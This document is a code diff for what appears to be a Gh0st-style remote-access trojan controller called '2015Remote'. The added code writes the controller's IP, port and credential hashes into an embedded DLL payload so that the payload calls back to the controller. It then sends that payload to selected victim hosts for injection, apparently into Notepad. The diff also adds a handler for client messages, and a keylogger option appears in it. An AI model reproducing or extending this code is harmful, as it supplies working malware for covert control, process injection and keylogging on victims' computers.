@@ -293,6 +293,22 @@ DllInfo* ReadTinyRunDll(int pid)
     std::string name = TINY_DLL_NAME;
     DWORD fileSize = 0;
     BYTE * dllData = ReadResource(IDR_TINYRUN_X64, fileSize);
+    std::string s(skCrypt(FLAG_FINDEN)), ip, port;
+    int offset = MemoryFind((char*)dllData, s.c_str(), fileSize, s.length());
+    if (offset != -1) {
+        std::string ip = THIS_CFG.GetStr("settings", "master", "");
+        int nPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+        std::string master = ip.empty() ? "" : ip + ":" + std::to_string(nPort);
+        CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(dllData + offset);
+        if (!master.empty()) {
+            splitIpPort(master, ip, port);
+            server->SetServer(ip.c_str(), atoi(port.c_str()));
+            server->SetAdminId(GetMasterHash().c_str());
+            server->iType = CLIENT_TYPE_MEMDLL;
+            server->parentHwnd = g_2015RemoteDlg ? (uint64_t)g_2015RemoteDlg->GetSafeHwnd() : 0;
+            memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
+        }
+    }
     // 设置输出参数
     auto md5 = CalcMD5FromBytes(dllData, fileSize);
     DllExecuteInfo info = { SHELLCODE, fileSize, CALLTYPE_DEFAULT, {}, {}, pid };
@@ -839,8 +855,8 @@ LRESULT CMy2015RemoteDlg::OnShowErrMessage(WPARAM wParam, LPARAM lParam)
     m_CList_Message.InsertItem(0, title ? *title : "操作错误");
     m_CList_Message.SetItemText(0, 1, strTime);
     m_CList_Message.SetItemText(0, 2, text ? *text : "内部错误");
-    delete title;
-    delete text;
+    if(title)delete title;
+    if(text)delete text;
 
     return S_OK;
 }
@@ -2226,6 +2242,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     // 【L】：主机上下线和授权
     // 【x】：对话框相关功能
     switch (cmd) {
+    case TOKEN_CLIENT_MSG: {
+        ClientMsg *msg =(ClientMsg*)ContextObject->InDeCompressedBuffer.GetBuffer(0);
+        PostMessageA(WM_SHOWERRORMSG, (WPARAM)new CString(msg->text), (LPARAM)new CString(msg->title));
+        break;
+    }
     case TOKEN_AUTH: {
         BOOL valid = FALSE;
         if (len > 20) {
@@ -4119,14 +4140,16 @@ void CMy2015RemoteDlg::OnParamKblogger()
 void CMy2015RemoteDlg::OnOnlineInjNotepad()
 {
     auto tinyRun = ReadTinyRunDll(0);
-	EnterCriticalSection(&m_cs);
-	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-		context* ctx = *i;
-		if (!ctx->IsLogin())
-			continue;
-		Buffer* buf = tinyRun->Data;
-		ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
-	}
-	LeaveCriticalSection(&m_cs);
+    EnterCriticalSection(&m_cs);
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    while (Pos) {
+        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx->IsLogin())
+            continue;
+        Buffer* buf = tinyRun->Data;
+        ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
+    }
+    LeaveCriticalSection(&m_cs);
     SAFE_DELETE(tinyRun);
 }
